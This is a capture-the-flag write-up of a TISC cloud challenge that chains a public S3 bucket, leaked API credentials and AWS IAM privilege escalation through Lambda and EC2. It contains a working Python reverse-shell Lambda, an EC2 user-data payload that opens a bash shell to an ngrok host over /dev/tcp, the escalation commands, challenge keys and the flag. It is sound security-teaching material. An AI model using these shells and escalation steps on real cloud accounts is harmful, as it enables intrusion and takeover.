# Level 4B - CloudyNekos

## Description

> We have received intelligence that Palindrome has started a global computing infrastructure to be made available to its agent to spin up C2 instances. They relied on Cloud Service Providers like AWS to provide computing resources for its agents. They have their own custom built access system e-service portal that generate short-lived credentials for their agents to use their computing infrastructure. It was said that their access system e-service was diguised as a blog site.
>
> We need your help to access their computing resources and exfiltrate any meaningful intelligence for us.
>
> Start here: http://d20whnyjsgpc34.cloudfront.net
>
> _NOTE_: Solving challenge 4B allows you to complete level 4, but unlocks challenge 5B only!

## Solution

### Dumping S3 Bucket

Visiting the webpage, we see the following clues in the HTML source.

```markup
<div class="p-5 text-center bg-light">
  <!-- Passcode -->
  <h1 class="mb-3">Cats rule the world</h1>
  <!-- Passcode -->
  <!-- 
    ----- Completed -----
    * Configure CloudFront to use the bucket - palindromecloudynekos as the origin
    
    ----- TODO -----
    * Configure custom header referrer and enforce S3 bucket to only accept that particular header
    * Secure all object access
  -->
  <h4 class="mb-3">—ฅ/ᐠ. ̫ .ᐟ\ฅ —</h4>
</div>
```

Here's what this is referring to - CloudFront is Amazon's CDN and can be configured to use an S3 bucket as its origin. The CloudFront site will then use files on the S3 buckets to serve the static page. But even so, the user could just access the S3 instance directly. The missing step here is to restrict direct access to the S3 bucket except from authenticated requests from CloudFront using Origin Access Identity (OAI).

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

The S3 bucket in its current state is readable by all authenticated users, so we could simply login to our own AWS account and use the AWS CLI to access the `palindromecloudynekos` bucket.

```
$ aws s3 cp s3://palindromecloudynekos . --recursive
download: s3://palindromecloudynekos/index.html to ./index.html
download: s3://palindromecloudynekos/error.html to ./error.html
download: s3://palindromecloudynekos/api/notes.txt to api/notes.txt
download: s3://palindromecloudynekos/img/photo6.jpg to img/photo6.jpg
download: s3://palindromecloudynekos/img/photo2.jpg to img/photo2.jpg
download: s3://palindromecloudynekos/img/photo4.jpg to img/photo4.jpg
download: s3://palindromecloudynekos/img/photo3.jpg to img/photo3.jpg
download: s3://palindromecloudynekos/img/photo5.jpg to img/photo5.jpg
download: s3://palindromecloudynekos/img/photo1.jpg to img/photo1.jpg
```

This gives us the next clue.

{% code title="api/notes.txt" overflow="wrap" %}
```
# Neko Access System Invocation Notes

Invoke with the passcode in the header "x-cat-header". The passcode is found on the cloudfront site, all lower caps and separated using underscore.

https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent

All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
```
{% endcode %}

As we saw earlier, the passcode is `X-Cat-Header: cats_rule_the_world`. By sending the appropriate request to the API endpoint, we get a set of AWS credentials.

{% code overflow="wrap" %}
```http
GET /prod/agent HTTP/2
Host: b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com
X-Cat-Header: cats_rule_the_world

HTTP/2 200 OK
Date: Mon, 12 Sep 2022 14:06:30 GMT
Content-Type: application/json
Content-Length: 296
Access-Control-Allow-Origin: *
Apigw-Requestid: YWZzigwJSQ0EPvw=

{"Message": "Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIAQYDFBGMS7BGNBM64", "Secret_Key": "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"}
```
{% endcode %}

### Enumerating Permissions

It was at this point that I tried different enumeration tools such as [enumerate-iam](https://github.com/andresriancho/enumerate-iam) and [pacu](https://github.com/RhinoSecurityLabs/pacu). Pacu came with a ton of useful modules which came in handy later on.

Here are the results that `enumerate-iam` gave.

{% code overflow="wrap" lineNumbers="true" %}
```
2022-08-28 14:26:49,796 - 90864 - [INFO] Starting permission enumeration for access-key-id "AKIAQYDFBGMS7D6342UC"
2022-08-28 14:26:51,590 - 90864 - [INFO] -- Account ARN : arn:aws:iam::051751498533:user/user-e2cb59ebe2e646dda46073d57b40f6fe
2022-08-28 14:26:51,590 - 90864 - [INFO] -- Account Id  : 051751498533
2022-08-28 14:26:51,590 - 90864 - [INFO] -- Account Path: user/user-e2cb59ebe2e646dda46073d57b40f6fe
2022-08-28 14:26:51,876 - 90864 - [INFO] Attempting common-service describe / list brute force.
2022-08-28 14:26:55,435 - 90864 - [INFO] -- sts.get_session_token() worked!
2022-08-28 14:26:55,787 - 90864 - [INFO] -- sts.get_caller_identity() worked!
2022-08-28 14:26:55,800 - 90864 - [INFO] -- ec2.describe_regions() worked!
2022-08-28 14:26:56,129 - 90864 - [INFO] -- ec2.describe_subnets() worked!
2022-08-28 14:26:59,674 - 90864 - [INFO] -- ec2.describe_security_groups() worked!
2022-08-28 14:27:01,068 - 90864 - [INFO] -- ec2.describe_route_tables() worked!
2022-08-28 14:27:01,462 - 90864 - [INFO] -- ec2.describe_vpcs() worked!
2022-08-28 14:27:02,711 - 90864 - [INFO] -- dynamodb.describe_endpoints() worked!
2022-08-28 14:27:03,140 - 90864 - [INFO] -- iam.list_roles() worked!
2022-08-28 14:27:03,512 - 90864 - [INFO] -- ec2.describe_instance_types() worked!
2022-08-28 14:27:06,672 - 90864 - [INFO] -- iam.list_instance_profiles() worked!
```
{% endcode %}

Pacu also gave similar results during my initial privileges scan.

### Some Useful Information

By trying each of these privileges one by one, I found some interesting information that would come in handy later.

For instance, `aws iam list-roles` gave a list of roles, some of which looked interesting:

```json
{
	"Path": "/",
	"RoleName": "ec2_agent_role",
	"RoleId": "AROAQYDFBGMSYSEMEVAEH",
	"Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
	"CreateDate": "2022-07-22T09:29:34+00:00",
	"AssumeRolePolicyDocument": {
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Principal": {
					"Service": "ec2.amazonaws.com"
				},
				"Action": "sts:AssumeRole"
			}
		]
	},
	"MaxSessionDuration": 3600
},
{
	"Path": "/",
	"RoleName": "lambda_agent_development_role",
	"RoleId": "AROAQYDFBGMS2NDQR5JSE",
	"Arn": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
	"CreateDate": "2022-07-22T09:29:34+00:00",
	"AssumeRolePolicyDocument": {
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Principal": {
					"Service": "lambda.amazonaws.com"
				},
				"Action": "sts:AssumeRole"
			}
		]
	},
	"MaxSessionDuration": 3600
},
{
	"Path": "/",
	"RoleName": "lambda_agent_webservice_role",
	"RoleId": "AROAQYDFBGMSTH7VQVGQC",
	"Arn": "arn:aws:iam::051751498533:role/lambda_agent_webservice_role",
	"CreateDate": "2022-07-22T09:29:35+00:00",
	"AssumeRolePolicyDocument": {
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Principal": {
					"Service": "lambda.amazonaws.com"
				},
				"Action": "sts:AssumeRole"
			}
		]
	}
}
```

`aws iam list-instance-profiles` also yielded a particularly interesting instance profile, `ec2_agent_instance_profile`.

```json
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_agent_instance_profile",
            "InstanceProfileId": "AIPAQYDFBGMS6EKSSQ2RF",
            "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
            "CreateDate": "2022-07-22T09:29:35+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2_agent_role",
                    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
                    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "CreateDate": "2022-07-22T09:29:34+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
```

### Getting lambda\_agent\_development\_role

A few more hours of staring at AWS documentation later, I decided to use Pacu's `whoami` command and surprisingly, there was a ton of useful information that Pacu has stored already.

<pre class="language-json"><code class="lang-json"><strong>"Permissions": {
</strong>    "Allow": {
      
      ...
      
      "lambda:CreateFunction": {
        "Resources": [
          "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
        ]
      },
      "lambda:GetFunction": {
        "Resources": [
          "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
        ]
      },
      "lambda:InvokeFunction": {
        "Resources": [
          "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
        ]
      },
      "iam:ListAttachedUserPolicies": {
        "Resources": [
          "arn:aws:iam::051751498533:user/${aws:username}"
        ]
      },
      "iam:PassRole": {
        "Resources": [
          "arn:aws:iam::051751498533:role/lambda_agent_development_role"
        ]
      },
      
      ...
      
    },
    "Deny": {}
  }
}
</code></pre>

In particular, we had `lambda:CreateFunction`, `lambda:InvokeFunction` and `iam:PassRole` privileges.&#x20;

The reason these did not show up in `enumerate-iam` is probably because `enumerate-iam` only does a naive bruteforce by attempting to invoke each privilege without any specific format as required in this challenge (e.g. `arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*`)

At this point we can consult this [great resource](https://github.com/BishopFox/iam-vulnerable/blob/main/README.md) by Bishop Fox that provides a nice table breakdown of different AWS privilege escalation techniques. Our current permissions correspond to technique 15 [here](https://bishopfox.com/blog/privilege-escalation-in-aws), which involves creating a Lambda function that assumes a privileged role, thus executing code with higher privileges.

First, we create a Python script that gives us a reverse shell.

```python
import os
import socket
import subprocess

def lambda_handler(event, context):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("HOST", PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
```

Then we zip this into a zip file like `function.zip`, and create a lambda function adhering to the name format above. Using `--role`, we pass the `lambda_agent_development_role` to this lambda function.

{% code overflow="wrap" %}
```
aws lambda create-function --function-name function:user-b5089e5404f049168e93e51cdba5d212-test --runtime python3.9 --role arn:aws:iam::051751498533:role/lambda_agent_development_role --handler code.lambda_handler --zip-file fileb://function.zip --timeout 100
```
{% endcode %}

After invoking the lambda function, we get a reverse shell on our listener!

{% code overflow="wrap" %}
```
aws lambda invoke --function-name user-b5089e5404f049168e93e51cdba5d212-test output.txt
```
{% endcode %}

### Getting ec2\_agent\_role

Now that we have access to `lambda_agent_development_role`, let's see how we can leverage our newfound permissions. After enumerating permissions again with our trusty enumeration scripts, we find out that we now have the permission to create EC2 instances.

At this point we need to remember this piece of information given to us early in the challenge, telling us the tags that are required.

{% code overflow="wrap" %}
```
All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
```
{% endcode %}

Our current permissions now correspond to technique 3 [here](https://bishopfox.com/blog/privilege-escalation-in-aws), involving the `iam:PassRole and ec2:RunInstances` permissions. Essentially, we could pass in an `--iam-instance-profile` to assign a role to the EC2 instance.

But in order to gain access to our newfound privileges we would need a way to gain access to our newly created EC2 instance. In this article, the authors leveraged the assigning of SSH key pairs and gained access through the public IP address of the EC2 instance.

> * The user needs to have some way to SSH into the newly created instance.
>   * In the example below, the user assigns a public SSH key stored in AWS to the instance and the user has access to the matching private key.

In this challenge, however, this method does not seem quite so feasible (in particular, I had a hard time figuring out how to get the public IP of the instance since we only had access to `run-instances` but _not_ `describe-instances`).&#x20;

It turned out there was a way to do this by using idempotency tokens, which allowed us to get updated information on the result of a previous command. As this was not my solution, I won't discuss it in detail.

> Idempotency ensures that an API request completes no more than one time. With an idempotent request, if the original request completes successfully, any subsequent retries complete successfully without performing any further actions. However, the result might contain updated information, such as the current creation status.

After a bit more googling, I came across this [blog post](https://s3cur3.it/home/practicing-aws-security-with-iamvulnerable-part-2) containing a similar scenario as the one we have here. It turns out that the [`user-data`](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html) option can be used to execute a script on startup. This is meant to help perform common configuration and setup tasks when provisioning an EC2 instance.

Piecing it all together, we can modify our previous lambda function to spawn an EC2 instance that runs a reverse shell on startup.

```python
import json
import boto3
import base64

def lambda_handler(event, context):
  client = boto3.client('ec2')
  response = client.run_instances(
    ImageId='ami-0b89f7b3f054b957e',
    SubnetId='subnet-0aa6ecdf900166741',
    TagSpecifications=[
        {
            'ResourceType': 'instance',
            'Tags': [
                {
                    'Key': 'agent',
                    'Value': 'user-17416bc58b3f40aa95a139bffdac450a'
                },
            ]
        },
    ],
    MaxCount=1,
    MinCount=1,
    IamInstanceProfile={
        'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'
    },
    UserData=base64.b64encode(b'#!/bin/bash\n\n/bin/bash -l > /dev/tcp/4.tcp.ngrok.io/18673 0<&1 2>&1\n').decode('utf-8')
  )
  return json.loads(json.dumps(response, default=str))
```

And we're in! We now have the `ec2_agent_role`.

<figure><img src="../../.gitbook/assets/ee7d6250386146fa988c65fa004e91c8.png" alt=""><figcaption></figcaption></figure>

### Getting the Flag

Once again, we obtain the credentials through the metadata endpoint and enumerate our privileges. This time, we only really had access to `dynamodb`.

The flag was stored in `flag_db` and easily retrievable using `aws dynamodb scan --table-name flag_db`.

```json
{
    "Items": [
        {
            "secret": {
                "S": "TISC{iT3_N0t_s0_C1oUdy}"
            },
            "name": {
                "S": "flag"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
```
